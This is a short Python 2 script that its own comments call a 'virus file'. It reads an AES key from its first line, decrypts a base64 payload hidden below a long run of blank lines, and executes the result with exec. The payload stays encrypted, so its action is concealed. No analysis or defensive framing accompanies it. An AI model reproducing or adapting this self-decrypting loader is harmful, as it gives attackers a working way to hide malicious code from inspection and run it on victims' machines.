######################################################## First script python
# coding=utf-8
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')



























#Start payload
#7dVc+Y0s14E6nT9pUSKhvMFSiajSvHK6DbL1KKTDSKgG4R0VigsbcoJblBbMq7Hs6ciTNYWka9qgVDgo3LmtWXvCGUVg89Jil/YVUC7thk+EhbNpr6e1pQIkmlV8DlcZUgfs0ScaqiQVA7srBWU4DeXoCpZyFgzwsXKf8Sy5Oq1/eDs256zqmcTdSAl4maNN5e2qOGUIBnUdt9fAkNjiYUaX2v5S9zY6SNlZIaiNcM8rpcf6PNMj1IuPEVfYIKOoywYX6zH5Ce+tbs/OYiSkuMcHbkuc4b4rqwftOnv6t46gJ5v7UQFKyiI/sNfCQ69wZtDZ0Hg68oBnqYae4RgBGWh0WGRpQbMX6ggFIBC80BWj5emWPduJ7YSmi37wQQ+IesFeLOW4SKYTadk41Qnbj0U/8ciXlyn4TsbBMsFYMogRwJ1tGX8Kr2TcxLIbBB8ljp9Yd1wear7lIogJF9XwFTn0fBCfsWxHGiODu2p+0efGg9rNh2DhepXCwAWCrwIXp5YG7ZThdaLGui5uNqgeRsAxmYa1szkw0coseTy6w6E7unx+LCq/yw93SKQ1oPc49UazcooYH6WtwTFCdJ9+j+icHSdaI3eBmFoM0qTasas98mU3OhgMYrU8+kgRgwsSW7HBOKlQgbVvtihvxgEO9IJLApwNaHZwnU1i0EEn4Bv8+PnXRIH/d2nFlT+XjW2WcfvFdCnwq++cYAW/5BSEnUDeHnHV4I+XgZd5PaYozcoxngRqDRocrbqA11z0UpOws+mi3KGX2QBBZcdpL5xW4CL0i4raU2Mk4qBVMFf7ey3hPueuFJzs4lD6TkRWXyzWjn6M9aNKglVzwtOUUn5Xgywzx8/9J7Q/eun6YwfIEMB1LbOgrt0wZwTzEb4f5S0QREfxG9jxRipB7iTXUajTRyjgHlKkcCpPc94gkzmyiWf16GJjhePGv5SblVSywmtfGQROfSDZbUZS04J0JZ0wmskam8iFPhkpEK5cmIXvQMQM72qEeLPbDGNCw+Sw/Ithn+20yX0H/pPWepgYEDhMflZykAmadQtY5dc18tyVRbwOIsf1XJRTRAk06iLqM5H1A3PoLWnsmi5bSZBFgbWE/r2acUPcScbcynIii4rJCubW361/z+zLVbMkcELIdE1MMZYC9Su50W4Sc0PfrkEMd/TTgfSdY1+9Ebb8Olr08ImrTVS2BQJK6RkC7hhr8FV9HO6yIRvwBJOPbb38LB3/wAngNn0ymaJelq2WTRXEvuMIgzI+KtHVgX06ghnQY+bjbEyYuBTagdvIG+Vg3E24ymmcw64Z0yIcF5wMMg1q5C9DBsmFpSUaz30hbJr8XKICHA7laPHaWSUg3Q3IQV4TS4R6G4fW6u7rmOqpqLQYWLhLqfBDzXGsZHRBbgio7QaQkeElgjoq4QhmJUPxcAg0Z/dC1KDlYSGauK7XHLdytGwlEtentXiyjAc1q7L0KxH1WUcjqQWUbJupQ6B/ZC562NPGm6dloZhKLc9WIRPHn1aHs89fePiKjSDys3YryCT8pi4/ZRvWW+AMqX2wO95EJ2QrHXmjNtlcM/j4vXQg5MQHuK31fncJk7GOmqVwYP5WvoTwmZQ6AvOjVnryG3cYnMeyMlNS12Si1+64k87SJa9KinpGvawA34I+k5v61tZiwe8fmlcmtdVqBUC0IPML7qiswg6bpvAxREgs6WcpoDXbBFe2YQrM47XWNPBwvJyrDMPZgttD/UcIbiYwZQJ9FYqS7UnmJESScDMgvgWA+/E4mMj5dBpmPekH6UymUHkhTZSrE7/7nLcUJlfRIXWMgCYirFAdfKTmUuDx0bCI0/Vl++o3AbxavjwI+m7gDwwj+O4DgSSpO9ZXYVo8uJ/qQhYuL6/bhromI3n2Zsmb2joNXYprbMKlr5cd9SXvIOtMlss+02aaV6YfCTGsfF4qCEPooeC7MYQHC6KHi09itQN/Xsj+g5nZPqEfPeuK3F7bKTU=
#End payload